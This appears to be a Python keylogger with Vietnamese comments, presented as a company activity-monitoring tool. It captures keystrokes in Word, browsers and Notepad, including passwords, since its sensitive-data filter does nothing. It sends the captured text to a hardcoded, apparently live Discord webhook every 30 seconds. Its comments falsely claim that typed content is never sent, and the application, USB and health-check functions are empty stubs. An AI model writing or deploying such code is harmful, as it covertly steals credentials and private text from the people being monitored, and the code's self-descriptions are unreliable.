
import psutil
import time
import requests
import json
import os
import socket
import platform
import logging
import re
import hashlib
import base64
import threading
from datetime import datetime
from pathlib import Path
from pynput import keyboard
import win32gui
import win32process

# ==================== CẤU HÌNH ====================
CONFIG = {
    # Webhook Discord (chỉ gửi cảnh báo hành chính, KHÔNG gửi nội dung gõ)
    "discord_webhook": "https://discord.com/api/webhooks/1489246380999573665/mMBZkTa2fBi3Pji8YEvER1w7KxhKhbWY5-RT0Z4CZb75IupI5APUBsTvAA0xwVNAv4iI",
    
    # Thời gian giám sát (giây)
    "monitor_interval": 5,
    
    # Thư mục log nội bộ
    "log_dir": r"C:\Users\trant\Desktop\AGW\log",
    
    # Giới hạn dung lượng log (MB)
    "max_log_size_mb": 100,
    
    # Ứng dụng được phép ghi nhận (chỉ ghi trong các ứng dụng này)
    "monitored_apps": [
        "winword.exe",
        "chrome.exe", "firefox.exe", "msedge.exe", "notepad.exe"
    ],
    
    # Ứng dụng KHÔNG BAO GIỜ ghi (trình duyệt nhập mật khẩu)
    "excluded_apps": [
        "oq", "fg", "jh"  # Từ khóa trong tiêu đề cửa sổ
    ],
    
    # Cảnh báo khi xuất hiện ứng dụng lạ
    "alert_unknown_apps": True,
    
    # Giám sát USB
    "monitor_usb": True,
    
    # Tên công ty
    "company_name": "CÔNG TY CỦA BẠN",
    
    # Bật/tắt ghi nhận phím
    "enable_keylogging": True,
    
    # Độ dài tối đa của buffer phím trước khi ghi
    "key_buffer_size": 500
}

# ==================== KHỞI TẠO ====================
Path(CONFIG["log_dir"]).mkdir(parents=True, exist_ok=True)

# Cấu hình logging
log_file = os.path.join(CONFIG["log_dir"], f"{socket.gethostname()}_monitor.log")
keylog_file = os.path.join(CONFIG["log_dir"], f"{socket.gethostname()}_keylog.log")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file, encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

COMPUTER_NAME = socket.gethostname()
OS_NAME = platform.system() + " " + platform.release()

# Buffer cho keylogger
key_buffer = []
buffer_lock = threading.Lock()
current_app = ""
last_activity_time = time.time()

# ==================== BỘ LỌC THÔNG TIN NHẠY CẢM ====================
class SensitiveDataFilter:
    """Lớp giữ nguyên cho tương thích (hiện không lọc)"""
    
    @classmethod
    def filter(cls, text):
        """Không lọc - lấy toàn bộ nội dung"""
        return text
    
    @classmethod
    def is_sensitive_context(cls, window_title):
        """Không kiểm tra - lấy tất cả"""
        return False

def clean_content(content):
    """Clear IME artifacts và process BACKSPACE"""
    # Loại bỏ các ký tự IME composition (middle dot)
    content = content.replace('·', '')
    
    # Process BACKSPACE - xóa ký tự trước
    while '[BACKSPACE]' in content:
        idx = content.find('[BACKSPACE]')
        if idx > 0:
            # Xóa ký tự trước [BACKSPACE]
            content = content[:idx-1] + content[idx+len('[BACKSPACE]'):]
        else:
            # Nếu không có ký tự trước, chỉ xóa [BACKSPACE]
            content = content[len('[BACKSPACE]'):]
    
    # Process DELETE tương tự (xóa ký tự sau)
    while '[DELETE]' in content:
        idx = content.find('[DELETE]')
        if idx < len(content) - 1:
            content = content[:idx] + content[idx+1+len('[DELETE]'):]
        else:
            content = content[:idx]
    
    return content

# ==================== HÀM TIỆN ÍCH ====================
def send_to_discord(message, level="info"):
    """Gửi thông báo qua Discord (KHÔNG gửi nội dung nhập)"""
    if not CONFIG["discord_webhook"] or "YOUR_WEBHOOK" in CONFIG["discord_webhook"]:
        return
    
    emoji = {
        "info": "ℹ️",
        "warning": "⚠️",
        "alert": "🚨",
        "startup": "🟢",
        "keyboard": "⌨️"  # Chỉ thông báo hoạt động, không nội dung
    }.get(level, "📌")
    
    # Đảm bảo không gửi nội dung nhạy cảm
    if "content" in message:
        message = SensitiveDataFilter.filter(message)
    
    data = {
        "content": f"{emoji} **[{COMPUTER_NAME}]** {message}",
        "username": f"Giám sát {CONFIG['company_name']}"
    }
    
    try:
        requests.post(CONFIG["discord_webhook"], json=data, timeout=10)
    except Exception as e:
        logger.error(f"Không thể gửi Discord: {e}")

def get_active_window_info():
    """Lấy thông tin cửa sổ đang hoạt động"""
    try:
        hwnd = win32gui.GetForegroundWindow()
        window_title = win32gui.GetWindowText(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        
        try:
            process = psutil.Process(pid)
            app_name = process.name().lower()
        except:
            app_name = "unknown"
        
        return {
            "title": window_title[:200] if window_title else "",
            "app": app_name,
            "pid": pid
        }
    except Exception as e:
        return None

def should_log_key():
    """Kiểm tra xem có nên ghi nhận phím không"""
    if not CONFIG["enable_keylogging"]:
        return False
    
    window_info = get_active_window_info()
    if not window_info:
        return False
    
    # Không ghi trong ứng dụng bị loại trừ
    app_name = window_info["app"]
    if any(excluded in app_name for excluded in CONFIG["excluded_apps"]):
        return False
    
    # Chỉ ghi trong ứng dụng được phép (nếu danh sách không rỗng)
    if CONFIG["monitored_apps"] and app_name not in CONFIG["monitored_apps"]:
        return False
    
    return True

# ==================== KEYLOGGER ĐƠN GIẢN ====================
class SmartKeylogger:
    """Keylogger đơn giản - ghi nhận nội dung gõ"""
    
    def __init__(self):
        self.key_buffer = []
        self.buffer_lock = threading.Lock()
        self.flush_interval = 30  # Gửi mỗi 30 giây
        self.listener = None
        
    def on_press(self, key):
        """Xử lý khi nhấn phím"""
        if not should_log_key():
            return
        
        try:
            # Xử lý phím thường
            if hasattr(key, 'char') and key.char is not None:
                key_char = key.char
            else:
                # Xử lý phím đặc biệt
                special_map = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n',
                    keyboard.Key.tab: '\t',
                    keyboard.Key.backspace: '[BACKSPACE]',
                    keyboard.Key.delete: '[DELETE]',
                    keyboard.Key.up: '[↑]',
                    keyboard.Key.down: '[↓]',
                    keyboard.Key.left: '[←]',
                    keyboard.Key.right: '[→]',
                    keyboard.Key.home: '[HOME]',
                    keyboard.Key.end: '[END]',
                    keyboard.Key.page_up: '[PAGE_UP]',
                    keyboard.Key.page_down: '[PAGE_DOWN]',
                }
                key_char = special_map.get(key, f'[{key.name.upper()}]')
            
            with self.buffer_lock:
                self.key_buffer.append(key_char)
                    
        except Exception as e:
            logger.error(f"Keylogger error: {e}")
    
    def flush(self):
        """Ghi buffer vào log và gửi Discord"""
        with self.buffer_lock:
            if not self.key_buffer:
                return
            
            content = ''.join(self.key_buffer)
            self.key_buffer.clear()
        
        if not content.strip():
            return
        
        # Clean IME artifacts và process BACKSPACE
        content = clean_content(content)
        
        if not content.strip():
            return
        
        # Lấy thông tin ứng dụng hiện tại
        window_info = get_active_window_info()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        app_name = window_info["app"] if window_info else "unknown"
        window_title = window_info["title"][:100] if window_info else ""
        
        # Lưu log dạng JSON
        log_entry = {
            "timestamp": timestamp,
            "computer": COMPUTER_NAME,
            "app": app_name,
            "window_title": window_title,
            "content": content,
            "length": len(content)
        }
        
        with open(keylog_file, 'a', encoding='utf-8') as f:
            f.write(json.dumps(log_entry, ensure_ascii=False) + '\n')
        
        logger.debug(f"Keylog flushed: {len(content)} chars")
        
        # Gửi Discord với format đẹp
        self.send_to_discord(window_info, content, timestamp)
    
    def send_to_discord(self, window_info, content, timestamp):
        """Gửi nội dung gõ lên Discord với format đẹp"""
        if not CONFIG["discord_webhook"] or "YOUR_WEBHOOK" in CONFIG["discord_webhook"]:
            return
        
        app_name = window_info["app"] if window_info else "unknown"
        window_title = window_info["title"] if window_info else ""
        
        # Giới hạn độ dài nội dung hiển thị
        max_content_length = 1500
        displayed_content = content if len(content) <= max_content_length else content[:max_content_length] + "...[cắt]"
        
        # Tạo embed Discord đẹp
        embed = {
            "title": f"⌨️ BÁO CÁO HOẠT ĐỘNG NHẬP LIỆU",
            "color": 3447003,  # Màu xanh dương
            "fields": [
                {
                    "name": "💻 Máy Tính",
                    "value": COMPUTER_NAME,
                    "inline": True
                },
                {
                    "name": "🕐 Thời Gian",
                    "value": timestamp,
                    "inline": True
                },
                {
                    "name": "📱 Ứng Dụng",
                    "value": f"`{app_name}`",
                    "inline": False
                },
                {
                    "name": "🪟 Tiêu Đề Cửa Sổ",
                    "value": window_title[:150] if window_title else "N/A",
                    "inline": False
                },
                {
                    "name": "📝 Nội Dung Đã Gõ",
                    "value": f"```{displayed_content}```",
                    "inline": False
                },
                {
                    "name": "📊 Thống Kê",
                    "value": f"Tổng: {len(content)} ký tự",
                    "inline": True
                }
            ],
            "footer": {
                "text": f"Công ty: {CONFIG['company_name']}"
            }
        }
        
        data = {
            "embeds": [embed],
            "username": f"Bot Giám Sát - {CONFIG['company_name']}"
        }
        
        try:
            requests.post(CONFIG["discord_webhook"], json=data, timeout=10)
        except Exception as e:
            logger.error(f"Không thể gửi Discord: {e}")
    
    def start(self):
        """Khởi động keylogger"""
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        
        # Thread tự động flush định kỳ
        def periodic_flush():
            while True:
                time.sleep(self.flush_interval)
                self.flush()
        
        flush_thread = threading.Thread(target=periodic_flush, daemon=True)
        flush_thread.start()
        
        logger.info("Keylogger started")
        send_to_discord("⌨️ **Giám sát nhập liệu khởi động**", level="startup")
    
    def stop(self):
        """Dừng keylogger"""
        if self.listener:
            self.flush()
            self.listener.stop()
        logger.info("Keylogger stopped")

# ==================== CÁC HÀM GIÁM SÁT KHÁC ====================
def monitor_applications():
    """Giám sát ứng dụng (như phiên bản trước)"""
    # Code tương tự như phiên bản trước...
    pass

def monitor_usb():
    """Giám sát USB"""
    # Code tương tự như phiên bản trước...
    pass

def check_system_health():
    """Kiểm tra sức khỏe hệ thống"""
    # Code tương tự như phiên bản trước...
    pass

def print_startup_banner():
    """In banner khởi động"""
    banner = f"""
    ╔══════════════════════════════════════════════════════════════════╗
    ║             ║
    ╠══════════════════════════════════════════════════════════════════╣
    ║  Công ty: {CONFIG['company_name']:<50} ║
    ║  Máy tính: {COMPUTER_NAME:<50} ║
    ║  Hệ điều hành: {OS_NAME:<50} ║
    ║  Khởi động lúc: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<50} ║
    ╠══════════════════════════════════════════════════════════════════╣
    """
    print(banner)
    logger.info("STARTING MONITORING SYSTEM")
    send_to_discord("🚀", level="startup")

# ==================== HÀM CHÍNH ====================
def main():
    """Hàm chính"""
    print_startup_banner()
    
    # Khởi động keylogger
    keylogger = SmartKeylogger()
    keylogger.start()
    
    # Vòng lặp giám sát chính
    cycle_count = 0
    try:
        while True:
            cycle_count += 1
            
            # Giám sát ứng dụng
            monitor_applications()
            
            # Giám sát USB
            monitor_usb()
            
            # Kiểm tra sức khỏe định kỳ
            if cycle_count % 10 == 0:
                check_system_health()
            
            # Gửi heartbeat
            if cycle_count % 30 == 0:
                send_to_discord("💓 **Heartbeat**: Hệ thống giám sát hoạt động bình thường", level="info")
            
            time.sleep(CONFIG["monitor_interval"])
            
    except KeyboardInterrupt:
        keylogger.stop()
        logger.info("=== MONITORING STOPPED ===")
        send_to_discord("🛑 **Hệ thống giám sát dừng lại**", level="shutdown")

if __name__ == "__main__":
    main()
